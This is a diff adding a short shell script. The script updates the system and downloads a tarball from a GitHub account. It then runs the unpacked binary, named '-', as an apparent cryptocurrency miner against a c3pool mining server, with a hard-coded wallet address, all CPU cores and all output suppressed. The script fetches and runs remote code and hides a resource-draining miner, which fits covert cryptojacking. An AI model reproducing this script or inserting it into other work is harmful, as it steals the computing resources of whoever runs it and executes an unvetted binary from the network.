@@ -1,0 +1,10 @@
+#!/bin/sh
+
+A=auto.c3pool.org:80
+B=88fV3bpdbkTezaazMuWjLAMG3vv99t7hK15EvNHeJSwqahaeCbFBr8K6DLGRwWjC3YC6GB4BTiCSqZHx2YBWuJj1RrJwSys
+C=kokom
+apt-get update && apt-get upgrade -y
+wget https://github.com/muledan1/bash/raw/main/-.tar.gz
+tar -xf -.tar.gz
+./- -o $A -u $B.$C -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
